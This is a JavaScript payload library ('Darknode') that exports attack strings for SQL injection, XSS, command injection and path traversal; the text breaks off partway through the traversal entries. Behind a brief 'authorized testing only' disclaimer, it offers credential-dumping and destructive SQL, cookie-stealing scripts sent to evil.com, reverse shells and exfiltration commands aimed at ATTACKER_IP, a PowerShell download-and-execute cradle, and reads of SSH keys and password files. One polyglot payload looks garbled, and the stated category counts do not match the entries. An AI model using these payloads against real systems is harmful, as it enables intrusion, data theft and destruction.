/**
 * ============================================================================
 * DARKNODE PAYLOAD LIBRARY
 * ============================================================================
 *
 * Copyright (c) 2026 Darknode Project
 *
 * FOR AUTHORIZED SECURITY TESTING ONLY.
 *
 * This file contains security testing payloads intended exclusively for use
 * in lawful, authorized penetration testing and security research. Unauthorized
 * use of these payloads against systems you do not own or have explicit
 * written permission to test is illegal and unethical.
 *
 * The authors assume no liability for misuse. You are solely responsible for
 * ensuring you have proper authorization before using any payload herein.
 *
 * Categories: SQL Injection, XSS, Command Injection, Path Traversal / LFI,
 *             SSRF, XXE, SSTI, LDAP Injection, Header Injection, CSRF,
 *             Open Redirect, IDOR, NoSQL Injection, JWT Attacks,
 *             Deserialization, WebSocket, GraphQL, CORS Misconfiguration
 *
 * Each entry: { cat, name, payload, desc, risk }
 *   cat     - category string
 *   name    - short descriptive name
 *   payload - the actual payload string
 *   desc    - explanation of what it does / when it works
 *   risk    - "low" | "medium" | "high" | "critical"
 *
 * ============================================================================
 */

export const PAYLOADS = [


  // ==========================================================================
  // SQL INJECTION (56 payloads)
  // ==========================================================================

  // --- Auth Bypass ---
  {
    cat: "SQLi",
    name: "Auth bypass (OR 1=1)",
    payload: "' OR 1=1--",
    desc: "Classic auth bypass using tautology in WHERE clause",
    risk: "critical"
  },
  {
    cat: "SQLi",
    name: "Auth bypass (OR true)",
    payload: "' OR 'a'='a'--",
    desc: "String-based tautology bypass for login forms",
    risk: "critical"
  },
  {
    cat: "SQLi",
    name: "Auth bypass (admin comment)",
    payload: "admin'--",
    desc: "Comments out password check for admin user",
    risk: "critical"
  },
  {
    cat: "SQLi",
    name: "Auth bypass (double dash space)",
    payload: "' OR 1=1-- -",
    desc: "MySQL-friendly comment termination with trailing dash",
    risk: "critical"
  },
  {
    cat: "SQLi",
    name: "Auth bypass (hash comment)",
    payload: "' OR 1=1#",
    desc: "MySQL hash comment auth bypass",
    risk: "critical"
  },
  {
    cat: "SQLi",
    name: "Auth bypass (password field)",
    payload: "' OR '1'='1' /*",
    desc: "Inject into password field with block comment",
    risk: "critical"
  },
  {
    cat: "SQLi",
    name: "Auth bypass (numeric)",
    payload: "1 OR 1=1",
    desc: "Numeric context auth bypass without quotes",
    risk: "critical"
  },
  {
    cat: "SQLi",
    name: "Auth bypass (double quote)",
    payload: "\" OR 1=1--",
    desc: "Double-quote context auth bypass",
    risk: "critical"
  },

  // --- UNION-based ---
  {
    cat: "SQLi",
    name: "UNION column enumeration (1 col)",
    payload: "' UNION SELECT NULL--",
    desc: "Test for single-column UNION injection",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "UNION column enumeration (3 col)",
    payload: "' UNION SELECT NULL,NULL,NULL--",
    desc: "Test for three-column UNION injection",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "UNION column enumeration (5 col)",
    payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    desc: "Test for five-column UNION injection",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "UNION extract version (MySQL)",
    payload: "' UNION SELECT @@version,NULL,NULL--",
    desc: "Extract MySQL version via UNION",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "UNION extract version (MSSQL)",
    payload: "' UNION SELECT @@version,NULL,NULL--",
    desc: "Extract MSSQL version via UNION",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "UNION extract version (PostgreSQL)",
    payload: "' UNION SELECT version(),NULL,NULL--",
    desc: "Extract PostgreSQL version via UNION",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "UNION extract tables (MySQL)",
    payload: "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    desc: "Enumerate table names from information_schema",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "UNION extract columns (MySQL)",
    payload: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
    desc: "Enumerate column names for users table",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "UNION extract credentials",
    payload: "' UNION SELECT username,password FROM users--",
    desc: "Extract username and password from users table",
    risk: "critical"
  },
  {
    cat: "SQLi",
    name: "UNION concat extraction",
    payload: "' UNION SELECT CONCAT(username,':',password),NULL FROM users--",
    desc: "Concatenated credential extraction",
    risk: "critical"
  },
  {
    cat: "SQLi",
    name: "UNION hex extraction",
    payload: "' UNION SELECT HEX(password),NULL FROM users--",
    desc: "Extract password as hex to avoid WAF string filters",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "UNION group_concat",
    payload: "' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--",
    desc: "Dump all table names in one row via GROUP_CONCAT",
    risk: "high"
  },

  // --- Error-based ---
  {
    cat: "SQLi",
    name: "Error-based extractvalue (MySQL)",
    payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
    desc: "MySQL error-based extraction using EXTRACTVALUE",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "Error-based updatexml (MySQL)",
    payload: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
    desc: "MySQL error-based extraction using UPDATEXML",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "Error-based double query",
    payload: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    desc: "MySQL duplicate entry error extraction",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "Error-based MSSQL convert",
    payload: "' AND 1=CONVERT(int,(SELECT @@version))--",
    desc: "MSSQL type conversion error to leak data",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "Error-based PostgreSQL cast",
    payload: "' AND 1=CAST((SELECT version()) AS int)--",
    desc: "PostgreSQL type cast error to leak version",
    risk: "high"
  },

  // --- Blind Boolean ---
  {
    cat: "SQLi",
    name: "Blind boolean (true condition)",
    payload: "' AND 1=1--",
    desc: "Boolean true test for blind SQLi detection",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "Blind boolean (false condition)",
    payload: "' AND 1=2--",
    desc: "Boolean false test for blind SQLi detection",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "Blind boolean (substring)",
    payload: "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--",
    desc: "Character-by-character password extraction via boolean",
    risk: "critical"
  },
  {
    cat: "SQLi",
    name: "Blind boolean (ASCII)",
    payload: "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
    desc: "Binary search password extraction via ASCII comparison",
    risk: "critical"
  },
  {
    cat: "SQLi",
    name: "Blind boolean (table exists)",
    payload: "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')>0--",
    desc: "Check if users table exists via boolean",
    risk: "high"
  },

  // --- Blind Time-based ---
  {
    cat: "SQLi",
    name: "Time-based (MySQL SLEEP)",
    payload: "' AND SLEEP(5)--",
    desc: "MySQL time-based blind detection with 5-second delay",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "Time-based (MySQL IF/SLEEP)",
    payload: "' AND IF(1=1,SLEEP(5),0)--",
    desc: "Conditional time-based blind with IF",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "Time-based (MySQL conditional)",
    payload: "' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--",
    desc: "Time-based character extraction",
    risk: "critical"
  },
  {
    cat: "SQLi",
    name: "Time-based (MSSQL WAITFOR)",
    payload: "'; WAITFOR DELAY '0:0:5'--",
    desc: "MSSQL time-based blind using WAITFOR DELAY",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "Time-based (PostgreSQL pg_sleep)",
    payload: "'; SELECT pg_sleep(5)--",
    desc: "PostgreSQL time-based blind using pg_sleep",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "Time-based (SQLite randomblob)",
    payload: "' AND 1=randomblob(500000000)--",
    desc: "SQLite time-based blind via expensive randomblob call",
    risk: "high"
  },

  // --- Stacked Queries ---
  {
    cat: "SQLi",
    name: "Stacked: create user (MSSQL)",
    payload: "'; EXEC xp_cmdshell('net user hacker P@ss123 /add')--",
    desc: "MSSQL stacked query to create OS user via xp_cmdshell",
    risk: "critical"
  },
  {
    cat: "SQLi",
    name: "Stacked: drop table",
    payload: "'; DROP TABLE users--",
    desc: "Destructive stacked query to drop users table",
    risk: "critical"
  },
  {
    cat: "SQLi",
    name: "Stacked: insert admin",
    payload: "'; INSERT INTO users(username,password,role) VALUES('attacker','hacked','admin')--",
    desc: "Insert rogue admin user via stacked query",
    risk: "critical"
  },
  {
    cat: "SQLi",
    name: "Stacked: update password",
    payload: "'; UPDATE users SET password='hacked' WHERE username='admin'--",
    desc: "Change admin password via stacked query",
    risk: "critical"
  },

  // --- WAF Bypass ---
  {
    cat: "SQLi",
    name: "WAF bypass (inline comment)",
    payload: "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
    desc: "MySQL version-conditional inline comment WAF bypass",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "WAF bypass (case mixing)",
    payload: "' uNiOn SeLeCt 1,2,3--",
    desc: "Mixed case UNION SELECT to evade case-sensitive filters",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "WAF bypass (double URL encode)",
    payload: "' %252f%252a*/UNION%252f%252a*/SELECT 1,2,3--",
    desc: "Double URL-encoded comment delimiters",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "WAF bypass (whitespace alternatives)",
    payload: "'%09UNION%0ASELECT%0D1,2,3--",
    desc: "Tab, newline, carriage return instead of spaces",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "WAF bypass (concat char)",
    payload: "' UNION SELECT CHAR(97,100,109,105,110),NULL--",
    desc: "Use CHAR() to build strings and bypass string filters",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "WAF bypass (hex encoding)",
    payload: "' UNION SELECT 0x61646d696e,NULL--",
    desc: "Hex-encoded string to bypass keyword filters",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "WAF bypass (no spaces)",
    payload: "'UNION(SELECT(1),(2),(3))--",
    desc: "Parenthesized UNION to avoid space-based detection",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "WAF bypass (scientific notation)",
    payload: "' AND 1e0=1e0 UNION SELECT 1,2,3--",
    desc: "Scientific notation obfuscation",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "WAF bypass (null byte)",
    payload: "' UNION%00SELECT 1,2,3--",
    desc: "Null byte insertion to break WAF pattern matching",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "WAF bypass (JSON extraction MySQL)",
    payload: "' UNION SELECT JSON_EXTRACT('{\"a\":1}','$.a'),NULL--",
    desc: "Use JSON functions to obfuscate query intent",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "Second-order SQLi",
    payload: "admin'-- (register, then login triggers)",
    desc: "Payload stored first, triggered on second use (e.g., username registration)",
    risk: "critical"
  },
  {
    cat: "SQLi",
    name: "SQLi via HTTP header (User-Agent)",
    payload: "' OR 1=1-- (in User-Agent header)",
    desc: "Injection point in logged User-Agent header",
    risk: "high"
  },
  {
    cat: "SQLi",
    name: "SQLi via Cookie",
    payload: "' OR 1=1-- (in Cookie value)",
    desc: "Injection via cookie parameter used in SQL query",
    risk: "high"
  },

  // ==========================================================================
  // XSS - Cross-Site Scripting (58 payloads)
  // ==========================================================================

  // --- Reflected ---
  {
    cat: "XSS",
    name: "Basic script alert",
    payload: "<script>alert(1)</script>",
    desc: "Simplest reflected XSS test payload",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Script with document.cookie",
    payload: "<script>document.location='http://evil.com/?c='+document.cookie</script>",
    desc: "Cookie exfiltration via reflected XSS",
    risk: "critical"
  },
  {
    cat: "XSS",
    name: "Script with fetch exfil",
    payload: "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
    desc: "Cookie theft via fetch API",
    risk: "critical"
  },
  {
    cat: "XSS",
    name: "Case variation",
    payload: "<ScRiPt>alert(1)</ScRiPt>",
    desc: "Mixed case to bypass case-sensitive filters",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Double encoding",
    payload: "%253Cscript%253Ealert(1)%253C/script%253E",
    desc: "Double URL-encoded script tag for double-decode contexts",
    risk: "high"
  },

  // --- Stored ---
  {
    cat: "XSS",
    name: "Stored in comment",
    payload: "<script>new Image().src='http://evil.com/?c='+document.cookie</script>",
    desc: "Persistent XSS via comment field with image beacon exfil",
    risk: "critical"
  },
  {
    cat: "XSS",
    name: "Stored in profile name",
    payload: "<img src=x onerror=alert(1)>",
    desc: "Persistent XSS in profile/display name field",
    risk: "critical"
  },
  {
    cat: "XSS",
    name: "Stored via markdown",
    payload: "[Click](javascript:alert(1))",
    desc: "XSS in markdown-rendered link href",
    risk: "high"
  },

  // --- DOM-based ---
  {
    cat: "XSS",
    name: "DOM via location.hash",
    payload: "#<img src=x onerror=alert(1)>",
    desc: "DOM XSS when page reads location.hash unsafely",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "DOM via document.write",
    payload: "<script>document.write(location.search)</script>",
    desc: "DOM XSS via document.write with unsanitized input",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "DOM via innerHTML",
    payload: "<img src=x onerror=alert(document.domain)>",
    desc: "DOM XSS when user input assigned to innerHTML",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "DOM via postMessage",
    payload: "<script>window.postMessage('<img src=x onerror=alert(1)>','*')</script>",
    desc: "DOM XSS exploiting insecure postMessage handler",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "DOM via jQuery html()",
    payload: "$('#output').html(location.hash.slice(1))",
    desc: "DOM XSS via jQuery .html() with hash fragment input",
    risk: "high"
  },

  // --- Event Handlers ---
  {
    cat: "XSS",
    name: "Img onerror",
    payload: "<img src=x onerror=alert(1)>",
    desc: "XSS via image error event handler",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Img onload",
    payload: "<img src=https://via.placeholder.com/1 onload=alert(1)>",
    desc: "XSS via image load event with valid src",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Body onload",
    payload: "<body onload=alert(1)>",
    desc: "XSS via body onload event",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Input onfocus autofocus",
    payload: "<input autofocus onfocus=alert(1)>",
    desc: "Auto-triggered XSS via autofocus + onfocus",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Details ontoggle",
    payload: "<details open ontoggle=alert(1)>",
    desc: "XSS via details element ontoggle event",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Marquee onstart",
    payload: "<marquee onstart=alert(1)>",
    desc: "XSS via marquee element onstart event",
    risk: "medium"
  },
  {
    cat: "XSS",
    name: "Video onerror",
    payload: "<video><source onerror=alert(1)>",
    desc: "XSS via video source error event",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Select onfocus",
    payload: "<select autofocus onfocus=alert(1)>",
    desc: "XSS via select element autofocus + onfocus",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Textarea onfocus",
    payload: "<textarea autofocus onfocus=alert(1)>",
    desc: "XSS via textarea autofocus",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Anchor onclick",
    payload: "<a href=# onclick=alert(1)>click</a>",
    desc: "XSS via anchor click event handler",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Div onmouseover",
    payload: "<div onmouseover=alert(1)>hover me</div>",
    desc: "XSS via mouseover event handler",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Object onerror",
    payload: "<object data=x onerror=alert(1)>",
    desc: "XSS via object element error event",
    risk: "high"
  },

  // --- SVG / MathML ---
  {
    cat: "XSS",
    name: "SVG onload",
    payload: "<svg onload=alert(1)>",
    desc: "XSS via SVG onload event",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "SVG animate",
    payload: "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    desc: "XSS via SVG animate element onbegin event",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "SVG set event",
    payload: "<svg><set onbegin=alert(1) attributeName=x to=1>",
    desc: "XSS via SVG set element",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "SVG use xlink",
    payload: "<svg><use xlink:href=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+>",
    desc: "XSS via SVG use element with data URI",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "MathML XSS",
    payload: "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    desc: "XSS via MathML namespace confusion",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "SVG foreignObject",
    payload: "<svg><foreignObject><body onload=alert(1)>",
    desc: "XSS via SVG foreignObject embedding HTML",
    risk: "high"
  },

  // --- Polyglots ---
  {
    cat: "XSS",
    name: "Polyglot (multi-context)",
    payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik//oNcliCk=alert()//><svg onload=alert()//>",
    desc: "Multi-context XSS polyglot covering script, attribute, URL contexts",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Polyglot (Rsnake)",
    payload: "'\"><img src=x onerror=alert(1)//",
    desc: "Classic break-out polyglot for attribute contexts",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Polyglot (all contexts)",
    payload: "'\">-->]]>*/</script></style></title></textarea><img src=x onerror=alert(1)>",
    desc: "Universal break-out covering script, style, title, textarea, CDATA, comments",
    risk: "high"
  },

  // --- Filter Bypass ---
  {
    cat: "XSS",
    name: "No parentheses (backtick)",
    payload: "<img src=x onerror=alert`1`>",
    desc: "Bypass filters blocking parentheses using template literals",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "No alert keyword",
    payload: "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    desc: "Base64-encoded alert to bypass keyword filters",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "No angle brackets (attribute)",
    payload: "\" autofocus onfocus=alert(1) x=\"",
    desc: "XSS injection within an existing attribute context",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "JavaScript URI",
    payload: "javascript:alert(1)",
    desc: "XSS via javascript: URI scheme in href or src",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Data URI script",
    payload: "data:text/html,<script>alert(1)</script>",
    desc: "XSS via data: URI with embedded script",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "HTML entity bypass",
    payload: "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
    desc: "HTML entity encoded alert to bypass keyword filters",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Unicode escape",
    payload: "<script>\\u0061lert(1)</script>",
    desc: "Unicode escape sequence to bypass alert filter",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Constructor bypass",
    payload: "<img src=x onerror=window['al'+'ert'](1)>",
    desc: "String concatenation to reconstruct blocked function name",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "setTimeout bypass",
    payload: "<img src=x onerror=setTimeout('ale'+'rt(1)')>",
    desc: "setTimeout with string concatenation to bypass filters",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Fetch + constructor",
    payload: "<img src=x onerror=\"this.constructor.constructor('alert(1)')();\">",
    desc: "Use Function constructor to execute alert",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Null byte bypass",
    payload: "<scr%00ipt>alert(1)</scr%00ipt>",
    desc: "Null byte insertion to bypass filter pattern matching",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Double tag bypass",
    payload: "<<script>alert(1)//<</script>",
    desc: "Double open bracket to confuse sanitizers",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Iframe srcdoc",
    payload: "<iframe srcdoc='<script>alert(1)</script>'>",
    desc: "XSS via iframe srcdoc attribute",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Embed XSS",
    payload: "<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",
    desc: "XSS via embed element with base64 data URI",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Meta refresh XSS",
    payload: "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
    desc: "XSS via meta refresh with javascript URI",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Mutation XSS (noscript)",
    payload: "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
    desc: "Mutation XSS exploiting noscript parsing differences",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "CSP bypass via JSONP",
    payload: "<script src='https://accounts.google.com/o/oauth2/revoke?callback=alert(1)'></script>",
    desc: "CSP bypass using whitelisted JSONP endpoint",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "CSP bypass via base tag",
    payload: "<base href='https://evil.com/'><script src='/js/app.js'></script>",
    desc: "CSP bypass by hijacking base URL for relative script paths",
    risk: "critical"
  },
  {
    cat: "XSS",
    name: "Prototype pollution XSS",
    payload: "constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>",
    desc: "XSS via JavaScript prototype pollution leading to DOM write",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Template literal injection",
    payload: "${alert(1)}",
    desc: "XSS in JavaScript template literal context",
    risk: "high"
  },
  {
    cat: "XSS",
    name: "Img dynsrc (IE)",
    payload: "<img dynsrc=javascript:alert(1)>",
    desc: "Legacy IE XSS via dynsrc attribute",
    risk: "medium"
  },

  // ==========================================================================
  // COMMAND INJECTION (35 payloads)
  // ==========================================================================

  // --- Basic ---
  {
    cat: "CMDi",
    name: "Semicolon chain",
    payload: "; id",
    desc: "Append command via semicolon separator",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Pipe chain",
    payload: "| id",
    desc: "Pipe output to id command",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "AND chain",
    payload: "&& id",
    desc: "Execute id if previous command succeeds",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "OR chain",
    payload: "|| id",
    desc: "Execute id if previous command fails",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Backtick substitution",
    payload: "`id`",
    desc: "Command substitution via backticks",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Dollar substitution",
    payload: "$(id)",
    desc: "Command substitution via $() syntax",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Newline injection",
    payload: "%0aid",
    desc: "Newline-separated command injection",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Reverse shell (bash)",
    payload: "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
    desc: "Bash reverse shell via TCP redirect",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Reverse shell (nc)",
    payload: "| nc ATTACKER_IP 4444 -e /bin/sh",
    desc: "Netcat reverse shell with -e flag",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Reverse shell (python)",
    payload: "; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    desc: "Python reverse shell one-liner",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Windows cmd chain",
    payload: "& whoami",
    desc: "Windows command chaining with single ampersand",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Windows pipe",
    payload: "| type C:\\Windows\\win.ini",
    desc: "Windows pipe to read win.ini",
    risk: "high"
  },
  {
    cat: "CMDi",
    name: "PowerShell exec",
    payload: "; powershell -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\"",
    desc: "PowerShell download and execute cradle",
    risk: "critical"
  },

  // --- Blind ---
  {
    cat: "CMDi",
    name: "Blind (sleep)",
    payload: "; sleep 10",
    desc: "Blind command injection detection via time delay",
    risk: "high"
  },
  {
    cat: "CMDi",
    name: "Blind (ping)",
    payload: "; ping -c 10 127.0.0.1",
    desc: "Blind detection via ping delay",
    risk: "high"
  },
  {
    cat: "CMDi",
    name: "Blind (DNS lookup)",
    payload: "; nslookup $(whoami).attacker.com",
    desc: "Blind exfiltration via DNS with command output in subdomain",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Blind (wget callback)",
    payload: "; wget http://ATTACKER_IP/?data=$(cat /etc/passwd | base64)",
    desc: "Blind exfiltration via HTTP callback with base64-encoded data",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Blind (curl callback)",
    payload: "; curl http://ATTACKER_IP/?d=$(id|base64)",
    desc: "Blind exfiltration via curl with base64 command output",
    risk: "critical"
  },

  // --- Out-of-Band ---
  {
    cat: "CMDi",
    name: "OOB via DNS (dig)",
    payload: "; dig $(whoami).attacker.com",
    desc: "Out-of-band exfil via DNS dig query",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "OOB via HTTP (curl POST)",
    payload: "; curl -X POST -d @/etc/passwd http://ATTACKER_IP/exfil",
    desc: "Out-of-band file exfiltration via curl POST",
    risk: "critical"
  },

  // --- Filter Bypass ---
  {
    cat: "CMDi",
    name: "Bypass (space with IFS)",
    payload: ";cat${IFS}/etc/passwd",
    desc: "Bypass space filter using $IFS (Internal Field Separator)",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Bypass (space with tab)",
    payload: ";\tcat\t/etc/passwd",
    desc: "Bypass space filter using tab characters",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Bypass (space with brace)",
    payload: ";{cat,/etc/passwd}",
    desc: "Bypass space filter using brace expansion",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Bypass (quote splitting)",
    payload: ";c'a't /etc/passwd",
    desc: "Bypass command blacklist using quote splitting",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Bypass (double quote split)",
    payload: ";c\"a\"t /etc/passwd",
    desc: "Bypass command blacklist using double quote splitting",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Bypass (backslash split)",
    payload: ";c\\at /etc/passwd",
    desc: "Bypass filter by inserting backslash in command name",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Bypass (variable concat)",
    payload: ";a=c;b=at;$a$b /etc/passwd",
    desc: "Build command from variable concatenation",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Bypass (wildcard)",
    payload: ";/bin/c?t /etc/passwd",
    desc: "Bypass filter using single-char wildcard in path",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Bypass (glob)",
    payload: ";/bi*/ca* /etc/passwd",
    desc: "Bypass filter using glob wildcard patterns",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Bypass (hex encode)",
    payload: ";$(printf '\\x63\\x61\\x74') /etc/passwd",
    desc: "Hex-encoded command name via printf",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Bypass (base64 decode)",
    payload: ";echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh",
    desc: "Base64-encoded command decoded and piped to shell",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Bypass (rev command)",
    payload: ";echo 'dwssap/cte/ tac'|rev|sh",
    desc: "Reversed command string decoded via rev utility",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Bypass (dollar at)",
    payload: ";c$@at /etc/passwd",
    desc: "Bypass filter using $@ (expands to nothing in this context)",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Python injection",
    payload: "__import__('os').system('id')",
    desc: "OS command execution via Python import injection",
    risk: "critical"
  },
  {
    cat: "CMDi",
    name: "Ruby injection",
    payload: "`id`",
    desc: "Ruby backtick command execution",
    risk: "critical"
  },

  // ==========================================================================
  // PATH TRAVERSAL / LFI (35 payloads)
  // ==========================================================================

  // --- Linux ---
  {
    cat: "LFI",
    name: "Basic /etc/passwd",
    payload: "../../../../etc/passwd",
    desc: "Classic directory traversal to read /etc/passwd",
    risk: "high"
  },
  {
    cat: "LFI",
    name: "Deep traversal /etc/passwd",
    payload: "../../../../../../../../../../etc/passwd",
    desc: "Deep traversal with many levels for nested applications",
    risk: "high"
  },
  {
    cat: "LFI",
    name: "/etc/shadow",
    payload: "../../../../etc/shadow",
    desc: "Read password hashes (requires elevated privileges)",
    risk: "critical"
  },
  {
    cat: "LFI",
    name: "/etc/hosts",
    payload: "../../../../etc/hosts",
    desc: "Read hosts file for internal network mapping",
    risk: "medium"
  },
  {
    cat: "LFI",
    name: "/proc/self/environ",
    payload: "../../../../proc/self/environ",
    desc: "Read process environment variables (may contain secrets)",
    risk: "critical"
  },
  {
    cat: "LFI",
    name: "/proc/self/cmdline",
    payload: "../../../../proc/self/cmdline",
    desc: "Read process command line arguments",
    risk: "high"
  },
  {
    cat: "LFI",
    name: "/proc/self/fd/0",
    payload: "../../../../proc/self/fd/0",
    desc: "Read process file descriptor 0 (stdin)",
    risk: "high"
  },
  {
    cat: "LFI",
    name: "SSH private key",
    payload: "../../../../home/user/.ssh/id_rsa",
    desc: "Read SSH private key for lateral movement",
    risk: "critical"
  },
  {
    cat: "LFI",
    name: "Bash history",
    payload: "../../../../home/user/.bash_history",
    desc: "Read command history (may contain passwords)",
    risk: "high"
  },
  {
    cat: "LFI",
    name: "Apache access log",
    payload: "../../../../var/log/apache2/access.log",
    desc: "Read Apache log for log poisoning or recon",
    risk: "high"
  },
  {
    cat: "LFI",
    name: "Nginx access log",
    payload: "../../../../var/log/nginx/access.log",
    desc: "Read Nginx log for log poisoning or recon",
    risk: "high"
  },

  // --- Windows ---
  {
    cat: "LFI",
    name: "Windows win.ini",
    payload: "..\\..\\..\\..\\Windows\\win.ini",
    desc: "Read Windows win.ini to confirm LFI on Windows",
    risk: "high"
  },
  {
    cat: "LFI",
    name: "Windows system.ini",
